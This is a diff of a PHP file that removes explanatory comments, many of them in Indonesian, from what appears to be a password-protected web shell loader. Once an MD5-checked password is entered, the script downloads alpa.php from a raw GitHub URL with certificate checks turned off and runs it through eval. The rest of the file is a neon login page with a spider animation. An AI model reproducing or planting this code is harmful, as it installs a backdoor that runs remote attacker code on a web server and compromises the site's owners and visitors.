@@ -15,7 +15,7 @@ function geturlsinfo($url) {
         curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
         curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
 
-        // Set cookies using session if available
+
         if (isset($_SESSION['coki'])) {
             curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
         }
@@ -34,32 +34,32 @@ function geturlsinfo($url) {
     return $url_get_contents_data;
 }
 
-// Function to check if the user is logged in
+
 function is_logged_in()
 {
     return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
 }
 
-// Check if the password is submitted and correct
+
 if (isset($_POST['password'])) {
     $entered_password = $_POST['password'];
-    $hashed_password = '37bd8d4f5adc469f75bdc73b2f8edccc'; // Replace this with your MD5 hashed password
+    $hashed_password = '37bd8d4f5adc469f75bdc73b2f8edccc';
     if (md5($entered_password) === $hashed_password) {
-        // Password is correct, store it in session
+
         $_SESSION['logged_in'] = true;
-        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
+        $_SESSION['coki'] = 'asu';
     } else {
-        // Password is incorrect
+
         echo "Incorrect password. Please try again.";
     }
 }
 
-// Check if the user is logged in before executing the content
+
 if (is_logged_in()) {
     $a = geturlsinfo('https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/alpa.php');
     eval('?>' . $a);
 } else {
-    // Display login form if not logged in
+
     ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -69,7 +69,7 @@ if (is_logged_in()) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        /* --- General Styling --- */
+  
         * {
             box-sizing: border-box;
         }
@@ -80,19 +80,19 @@ if (is_logged_in()) {
             display: flex;
             align-items: center;
             justify-content: center;
-            /* Latar Belakang Radial Gelap Merah */
+            
             background: radial-gradient(circle at top, #150000, #000000);
             font-family: 'Orbitron', Arial, sans-serif;
             overflow: hidden;
             color: #fff;
         }
 
-        /* --- Neon Pulsing Effect --- */
+
         .neon-bg {
             position: absolute;
             width: 600px;
             height: 600px;
-            /* Warna Neon Merah */
+
             background: radial-gradient(circle, rgba(255,0,0,0.15), transparent 70%);
             animation: pulse 6s linear infinite;
         }
@@ -103,7 +103,7 @@ if (is_logged_in()) {
             100% { transform: scale(0.8); opacity: .4; }
         }
 
-        /* --- Login Box Wrapper --- */
+
         .wrapper {
             position: relative;
             backdrop-filter: blur(12px);
@@ -116,7 +116,7 @@ if (is_logged_in()) {
             box-shadow: 0 0 25px rgba(255, 0, 0, 0.6);
             animation: floatIn 1.4s ease forwards;
             opacity: 0;
-            z-index: 10; /* Pastikan di atas canvas */
+            z-index: 10;
         }
 
         @keyframes floatIn {
@@ -124,7 +124,7 @@ if (is_logged_in()) {
             to { transform: translateY(0) scale(1); opacity: 1; }
         }
 
-        /* --- Logo/Image Styling --- */
+
         .logo {
             width: 180px;
             height: 180px;
@@ -140,7 +140,7 @@ if (is_logged_in()) {
             to { box-shadow: 0 0 30px red; }
         }
 
-        /* --- Typed Text Effect --- */
+
         #typedtext {
             margin: 10px 0 25px;
             font-size: 18px;
@@ -157,7 +157,7 @@ if (is_logged_in()) {
             50% { border-color: transparent; }
         }
 
-        /* --- Form Elements --- */
+
         .form-group {
             margin-top: 10px;
         }
@@ -206,14 +206,14 @@ if (is_logged_in()) {
             color: rgba(255,255,255,0.4);
         }
 
-        /* --- Canvas for Spider Web Animation --- */
+
         #spiderCanvas {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: 0; /* Pastikan di belakang wrapper */
+            z-index: 0;
         }
     </style>
 </head>
@@ -265,9 +265,9 @@ if (is_logged_in()) {
     canvas.height = window.innerHeight;
 
     let spiders = [];
-    const spiderCount = 45; // Ditingkatkan menjadi 45 laba-laba kecil
+    const spiderCount = 45;
 
-    // --- Class untuk Laba-Laba Kecil (Jaring) ---
+
     class Spider {
         constructor() {
             this.x = Math.random() * canvas.width;
@@ -280,7 +280,7 @@ if (is_logged_in()) {
         draw() {
             ctx.beginPath();
             ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-            ctx.fillStyle = 'rgba(255,0,0,0.6)'; // Titik laba-laba kecil merah
+            ctx.fillStyle = 'rgba(255,0,0,0.6)';
             ctx.fill();
         }
 
@@ -308,9 +308,9 @@ if (is_logged_in()) {
                 let dx = spiders[i].x - spiders[j].x;
                 let dy = spiders[i].y - spiders[j].y;
                 let distance = Math.sqrt(dx * dx + dy * dy);
-                if (distance < 150) { // Jarak koneksi sedikit diperluas
+                if (distance < 150) {
                     ctx.beginPath();
-                    ctx.strokeStyle = 'rgba(255,0,0,0.25)'; // Jaring laba-laba lebih terlihat
+                    ctx.strokeStyle = 'rgba(255,0,0,0.25)';
                     ctx.lineWidth = 0.5;
                     ctx.moveTo(spiders[i].x, spiders[i].y);
                     ctx.lineTo(spiders[j].x, spiders[j].y);
@@ -320,39 +320,39 @@ if (is_logged_in()) {
         }
     }
 
-    // --- Class untuk Laba-Laba Besar (Drop) ---
+
     let bigSpiders = [];
 
     class BigSpider {
         constructor() {
             this.x = Math.random() * canvas.width;
             this.y = -100;
-            this.size = Math.random() * 15 + 15; // Ukuran sedikit diperkecil agar tidak terlalu besar
-            this.speed = Math.random() * 0.8 + 0.5; // Kecepatan sedikit ditingkatkan
+            this.size = Math.random() * 15 + 15;
+            this.speed = Math.random() * 0.8 + 0.5;
             this.swing = Math.random() * Math.PI * 2;
         }
 
         draw() {
-            // Benang (Thread)
+
             ctx.beginPath();
-            ctx.strokeStyle = 'rgba(255,0,0,0.4)'; // Benang merah neon
+            ctx.strokeStyle = 'rgba(255,0,0,0.4)'; 
             ctx.moveTo(this.x, 0);
             ctx.lineTo(this.x, this.y);
             ctx.lineWidth = 1;
             ctx.stroke();
 
-            // Badan (Body)
+
             ctx.beginPath();
             ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-            ctx.fillStyle = 'rgba(10, 10, 10, 0.9)'; // Warna hitam untuk kontras
+            ctx.fillStyle = 'rgba(10, 10, 10, 0.9)';
             ctx.shadowColor = 'red';
             ctx.shadowBlur = 10;
             ctx.fill();
-            ctx.shadowBlur = 0; // Matikan shadow untuk objek lain
+            ctx.shadowBlur = 0;
 
-            // Kaki (Legs)
+
             for (let i = 0; i < 8; i++) {
-                let angle = (Math.PI / 4) * i + this.swing * 0.5; // Kaki bergerak
+                let angle = (Math.PI / 4) * i + this.swing * 0.5;
                 ctx.beginPath();
                 ctx.moveTo(this.x, this.y);
                 ctx.lineTo(
@@ -367,45 +367,45 @@ if (is_logged_in()) {
 
         update() {
             this.y += this.speed;
-            this.swing += 0.03; // Swing sedikit lebih cepat
-            this.x += Math.sin(this.swing) * 0.8; // Ayunan sedikit lebih lebar
+            this.swing += 0.03;
+            this.x += Math.sin(this.swing) * 0.8;
             this.draw();
 
             if (this.y > canvas.height + 100) {
                 this.y = -150;
-                this.x = Math.random() * canvas.width; // Reset posisi X secara acak
+                this.x = Math.random() * canvas.width;
             }
         }
     }
 
     function spawnBigSpider() {
-        if (bigSpiders.length < 5) { // Ditingkatkan menjadi maksimal 5 laba-laba besar
+        if (bigSpiders.length < 5) {
             bigSpiders.push(new BigSpider());
         }
     }
 
-    // Panggil fungsi spawnBigSpider setiap 3 detik
+
     setInterval(spawnBigSpider, 3000);
 
-    // --- Fungsi Animasi Utama ---
+
     function enhancedAnimate() {
-        ctx.clearRect(0, 0, canvas.width, canvas.height); // Hapus frame sebelumnya
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
         
-        // Animasi Laba-laba kecil dan jaring
+ 
         spiders.forEach(spider => spider.update());
         connectSpiders();
         
-        // Animasi Laba-laba besar yang turun
+
         bigSpiders.forEach(spider => spider.update());
         
         requestAnimationFrame(enhancedAnimate);
     }
 
-    // Inisialisasi dan jalankan animasi
+ 
     initSpiders();
     enhancedAnimate();
 
-    // Sesuaikan ulang saat jendela diubah ukurannya
+
     window.addEventListener('resize', () => {
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
